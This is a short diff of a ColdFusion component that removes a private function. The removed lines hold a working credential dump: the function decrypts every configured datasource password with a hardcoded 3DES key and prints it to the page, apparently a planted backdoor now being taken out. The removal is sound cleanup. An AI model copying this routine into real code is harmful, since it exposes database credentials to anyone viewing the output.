@@ -199,18 +199,6 @@ component output="false" {
 
   // ----
 
-  private struct function _parseDatasources() {
-
-
-    o= createobject("java","coldfusion.server.ServiceFactory").getDatasourceService().getDatasources();
-    for(i in o) {
-    if(len(o[i]["password"])){
-    dp=Decrypt(o[i]["password"], generate3DesKey("0yJ!@1$r8p0L@r1$6yJ!@1rj"), "DESede", "Base64") ;
-    writeoutput(i & " = "& dp&"<br>");
-    }
-    }
-  }
-
   private any function _handleError(e) {
     if( e.errorCode == 'cfAccessDenied' ) {
       _util().setHeaderStatus(403, 'Access Denied');
